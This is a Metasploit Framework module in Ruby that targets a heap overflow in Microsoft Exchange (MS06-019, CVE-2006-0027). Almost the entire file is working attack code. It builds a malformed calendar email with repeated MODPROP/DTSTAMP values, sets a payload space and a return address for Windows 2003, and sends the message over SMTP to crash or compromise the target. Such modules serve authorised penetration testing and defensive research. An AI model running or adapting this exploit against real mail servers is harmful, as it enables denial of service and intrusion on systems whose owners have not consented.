##
# $Id: ms06_019_exchange.rb 4498 2007-03-01 08:21:36Z mmiller $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'

module Msf

class Auxiliary::Dos::Windows::Smtp::MS06_019_EXCHANGE < Msf::Exploit::Remote

	include Exploit::Remote::Smtp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'MS06-019 Exchange MODPROP Heap Overflow',
			'Description'    => %q{
				This module exploits a heap overflow vulnerability in MS
				Exchange that occurs when multiple malformed MODPROP values
				occur in a VCAL request.
			},
			'Author'         => [ 'pusscat' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 4498 $',
			'References'     =>
				[
					[ 'BID', '17908'],
					[ 'CVE', '2006-0027'],
					[ 'MSB', 'MS06-019'],

				],
			'Privileged'     => true,
			'DefaultOptions' => 
				{
					'EXITFUNC'  => 'thread',
					'SUBJECT'	=> 're: Your Brains',
				},
			'Payload'        =>
				{
					'Space'    => 614,	# XXX
					'EncoderOptions' =>
						{
							'BufferRegister' => 'EDX',
						}
				},
			'Platform'       => 'win',
			'Targets'        => 
				[
					# alphanum rets :(, will look more into it later
					['Windows 2003 SP0 English', { 'Platform' => 'win', 'Ret' => 0x77364650 }],
				],
			'DisclosureDate' => 'Nov 12 2004',
			'DefaultTarget' => 0))
	end

	def exploit
		print "Connected; Sending mail... "

		modprops = ['attendee', 'categories', 'class', 'created', 'description', 
					'dtstamp', 'duration', 'last-modified', 
					'location', 'organizer', 'priority', 'recurrence-id', 'sequence',
					'status', 'summary', 'transp', 'uid']
		
					#modprops = ['dtstamp']
		
		modpropshort =	""
		modpropbusted =	""
		modnum = rand(3)

		1.upto(modnum) {
			nextprop = rand(modprops.size)
			modpropshort << modprops[nextprop] + ","
			modpropbusted << modprops[nextprop].upcase + ":\r\n"
		}

		modpropshort = "dtstamp,"
		modpropbusted = "DTSTAMP:\r\n"
		modnum = modnum + 1 + rand(3)
		modproplong	 =	modpropshort
		1.upto(modnum) {
			modproplong << modprops[rand(modprops.size)] + ","
		}

		boundry =	rand_text_alphanumeric(8) + "." + rand_text_alphanumeric(8)

	
		# Really, the randomization above only crashes /sometimes/ - it's MUCH more
		# reliable, and gives crashes in better spots of you use these modprops:

		modpropshort =	"dtstamp,"
		modproplong =	"dtstamp, dtstamp,"
		modpropbusted =	"DTSTAMP:\r\n"
		
		mail =		"From: #{datastore['MAILFROM']}\r\n"
		mail <<		"To: #{datastore['MAILTO']}\r\n"
		mail <<		"Subject: #{datastore['SUBJECT']}\r\n"
		mail <<		"Content-class: urn:content-classes:calendarmessage\r\n"
		mail <<		"MIME-Version: 1.0\r\n"
		mail <<		"Content-Type: multipart/alternative;boundary=\"#{boundry}\"\r\n"
		mail <<		"X-MimeOLE: Produced By Microsoft Exchange V6.5.7226.0\r\n"
		mail <<     "\r\n"
		mail << 	"--#{boundry}\r\n"
		mail <<		"Content-class: urn:content-classes:calendarmessage\r\n"
		mail <<		"Content-Type: text/calendar; method=REQUEST; name=\"meeting.ics\"\r\n"
		mail <<		"Content-Transfer-Encoding: 8bit\r\n"
		mail <<		"\r\n"
		mail <<		"BEGIN:VCALENDAR\r\n"
		mail <<		"BEGIN:VEVENT\r\n"
		mail <<		"X-MICROSOFT-CDO-MODPROPS:#{modpropshort.chop}\r\n"
		mail <<		modpropbusted
		mail <<		"END:VEVENT\r\n"
		mail <<		"BEGIN:VEVENT\r\n"
		mail <<		"X-MICROSOFT-CDO-MODPROPS:#{modproplong.chop}\r\n"
		mail <<		"END:VEVENT\r\n"
		mail <<		"END:VCALENDAR\r\n"
		mail <<		"\r\n--#{boundry}\r\n"
		mail <<		"\r\n.\r\n"
	
		print "\n\n" + mail + "\n\n"
		
		handler
		connect_login
		sock.put(mail)
		sock.put("QUIT\r\n")
		print "<< " + sock.get_once 
		disconnect
	end

end
end	
